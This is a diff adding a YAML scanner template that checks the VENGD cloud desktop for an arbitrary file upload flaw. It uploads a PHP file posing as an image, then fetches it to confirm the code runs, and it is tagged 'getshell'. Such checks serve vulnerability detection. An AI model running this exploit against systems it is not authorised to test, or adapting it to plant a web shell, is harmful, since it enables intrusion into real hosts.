@@ -1,0 +1,29 @@
+name: VENGD Arbitrary File Upload
+manual: true
+query: title="和信下一代云桌面VENGD"
+transport: http
+set:
+  str1: randomLowercase(7)
+  r1: randomInt(400000, 448000)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Upload/upload_file.php?l=test
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+      body: "------WebKitFormBoundaryfcKRltGv\r\nContent-Disposition: form-data; name=\"file\";
+        filename=\"{{r1}}.php\"\r\nContent-Type: image/avif\r\n\r\n<?php\r\nprint
+        \"{{str1}}\";\r\n?>\r\n------WebKitFormBoundaryfcKRltGv--"
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /Upload/test/{{r1}}.php
+    expression: response.status == 200 && response.body.bcontains(b"{{str1}}")
+expression: r0() && r1()
+detail:
+  links:
+  - https://blog.csdn.net/weixin_44146996/article/details/115611026
+  description: VENGD
+  tags: getshell
